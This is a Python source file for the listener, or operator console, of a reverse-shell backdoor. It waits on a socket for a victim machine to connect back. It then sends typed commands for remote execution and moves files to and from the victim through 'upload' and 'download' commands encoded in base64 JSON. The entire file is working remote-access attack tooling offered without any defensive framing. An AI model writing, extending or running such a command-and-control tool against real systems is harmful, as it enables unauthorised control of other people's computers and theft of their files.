import socket, json, base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+]Listening...")
        self.connection, address = listener.accept()
        print("Got a new connection from"+ str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()
        # self.connection.send(command)
        # return self.connection.recv(1024)
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successfull"

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())



    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.exec_remotely(command)
                if command[0] == "download" and "[-]Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-]Error during command execution"
            print(result)

my_list = Listener("127.0.0.1", 8000)
my_list.run()